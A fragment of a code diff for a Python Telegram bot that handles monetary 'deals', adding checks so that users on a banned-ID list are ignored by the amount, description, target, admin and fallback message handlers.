 async def process_amount(message: types.Message, state: FSMContext):
+    if message.from_user.id in BANNED_IDS:
+        return
     try:
         amount = float(message.text.replace(',', '.'))
         await state.update_data(amount=amount)
@@ -1295,6 +1400,8 @@ async def process_amount(message: types.Message, state: FSMContext):
 async def process_description(message: types.Message, state: FSMContext, bot: Bot):
     global BOT_USERNAME
     user_id = message.from_user.id
+    if user_id in BANNED_IDS:
+        return
     lang = user_data[user_id]['lang']
     data = await state.get_data()
     deal_id = str(uuid.uuid4())[:8]
@@ -1333,6 +1440,8 @@ async def process_description(message: types.Message, state: FSMContext, bot: Bo
 
 @dp.message(DealStates.awaiting_target_username)
 async def process_target(message: types.Message, state: FSMContext):
+    if message.from_user.id in BANNED_IDS:
+        return
     await state.update_data(target_username=message.text.strip())
     lang = user_data[message.from_user.id]['lang']
     data = await state.get_data()
@@ -1352,7 +1461,7 @@ async def process_target(message: types.Message, state: FSMContext):
 async def process_admin_input(message: types.Message, state: FSMContext):
     global VALUTE
     user_id = message.from_user.id
-    if user_id not in ADMIN_IDS:
+    if user_id in BANNED_IDS or user_id not in ADMIN_IDS:
         return
     action = admin_pending.pop(user_id, None)
     await state.clear()
@@ -1402,6 +1511,8 @@ async def process_admin_input(message: types.Message, state: FSMContext):
 
 @dp.message(F.text, ~F.text.startswith("/"))
 async def handle_message_fallback(message: types.Message, state: FSMContext):
+    if message.from_user.id in BANNED_IDS:
+        return
     await state.clear()
     await cmd_start(message, state, message.bot, CommandObject(args=""))
 
